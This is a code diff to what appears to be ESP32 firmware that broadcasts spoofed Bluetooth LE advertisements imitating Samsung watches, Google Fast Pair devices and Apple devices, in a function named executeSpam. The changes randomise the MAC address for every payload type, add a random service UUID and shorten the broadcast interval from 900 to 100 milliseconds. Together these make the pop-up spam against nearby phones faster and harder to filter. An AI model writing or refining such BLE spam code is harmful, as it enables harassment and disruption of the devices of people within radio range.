@@ -392,7 +392,7 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
     case Samsung: {
 
       uint8_t model = watch_models[random(26)].value;
-      uint8_t Samsung_Data[15] = { 0x0E, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, (model >> 0x00) & 0xFF };
+      uint8_t Samsung_Data[15] = { 0x0E, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, (uint8_t)((model >> 0x00) & 0xFF) };
       AdvData.addData(std::string((char *)Samsung_Data, 15));
 
       break;
@@ -401,8 +401,8 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
       const uint32_t model = android_models[rand() % android_models_count].value; // Action Type
       uint8_t Google_Data[14] = {
         0x03, 0x03, 0x2C, 0xFE, //First 3 data to announce Fast Pair
-        0x06, 0x16, 0x2C, 0xFE, (model >> 0x10) & 0xFF, (model >> 0x08) & 0xFF, (model >> 0x00) & 0xFF, // 6 more data to inform FastPair and device data
-        0x02, 0x0A, (rand() % 120) - 100 }; // 2 more data to inform RSSI data.
+        0x06, 0x16, 0x2C, 0xFE, (uint8_t)((model >> 0x10) & 0xFF), (uint8_t)((model >> 0x08) & 0xFF), (uint8_t)((model >> 0x00) & 0xFF), // 6 more data to inform FastPair and device data
+        0x02, 0x0A, (uint8_t)((rand() % 120) - 100) }; // 2 more data to inform RSSI data.
       AdvData.addData(std::string((char *)Google_Data, 14));
       break;
     }
@@ -419,17 +419,16 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
   //// https://github.com/Spooks4576
 void executeSpam(EBLEPayloadType type) {
   uint8_t macAddr[6];
-  if(type != Apple) {
-    generateRandomMac(macAddr);
-    esp_base_mac_addr_set(macAddr);
-  }
+  generateRandomMac(macAddr);
+  esp_base_mac_addr_set(macAddr);
   BLEDevice::init("");
   delay(10);
   esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
   pAdvertising = BLEDevice::getAdvertising();
-  delay(40);
   BLEAdvertisementData advertisementData = GetUniversalAdvertisementData(type);
   BLEAdvertisementData oScanResponseData = BLEAdvertisementData();
+  NimBLEUUID uuid((uint32_t)(random() & 0xFFFFFF));
+  pAdvertising->addServiceUUID(uuid);
   pAdvertising->setAdvertisementData(advertisementData);
   pAdvertising->setScanResponseData(oScanResponseData);
   //pAdvertising->setAdvertisementType(ADV_TYPE_IND);
@@ -447,7 +446,7 @@ void aj_adv(int ble_choice){
   int count = 0;
   timer = millis();
   while(1) {
-    if(millis()-timer >900) {
+    if(millis()-timer >100) {
 
       switch(ble_choice){
         case 0: // Applejuice
